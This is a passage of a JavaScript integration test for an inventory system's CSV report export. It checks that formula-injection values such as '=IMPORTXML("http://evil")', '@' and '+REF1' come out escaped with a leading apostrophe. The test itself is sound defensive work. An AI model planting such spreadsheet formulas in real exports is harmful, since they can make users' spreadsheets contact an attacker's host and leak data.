    const badExport = await server.requestJson("/api/reports/export.csv?type=unknown", { token: admin.token });
    assert.equal(badExport.status, 400);
  });

  it("GET /api/reports/export.csv?type=inventory emits UTF-8 BOM and neutralizes formula injection", async () => {
    const tag = makeUniqueTag("InvCsv");
    const admin = await tracker.createUser({ role: "admin" });

    const [invRes] = await pool.execute(
      "INSERT INTO inventory_items (name, category, quantity, unit, unit_cost) VALUES (?, 'Ingredients', 50, 'pcs', 5.000000)",
      [`@InvFormula_${tag}`],
    );
    const invId = Number(invRes.insertId);
    tracker.inventoryItemIds.add(invId);

    await pool.execute(
      `INSERT INTO inventory_movements (
         inventory_item_id, user_id, movement_type, quantity_change, note,
         item_name_snapshot, actor_name_snapshot, before_quantity, after_quantity, unit,
         batch_cost, supplier_name, reference_no, created_at
       ) VALUES (?, ?, 'restock', 10, 'Inv CSV test', ?, ?, 40, 50, 'pcs', 250.00, '=IMPORTXML("http://evil")', '+REF1', '2021-06-19 09:00:00')`,
      [invId, admin.id, `@InvFormula_${tag}`, admin.displayName],
    );

    const invCsv = await server.requestRaw(
      `/api/reports/export.csv?type=inventory&from=2021-06-19&to=2021-06-19&itemId=${invId}`,
      { token: admin.token },
    );
    assert.equal(invCsv.status, 200);
    assert.equal(invCsv.text.startsWith("\uFEFF"), true);
    const allInvCells = parseCsvRows(invCsv.text).slice(1).flat();
    assert.ok(allInvCells.includes(`'@InvFormula_${tag}`));
    assert.ok(allInvCells.includes("'=IMPORTXML(\"http://evil\")"));
    assert.ok(allInvCells.includes("'+REF1"));
  });
});
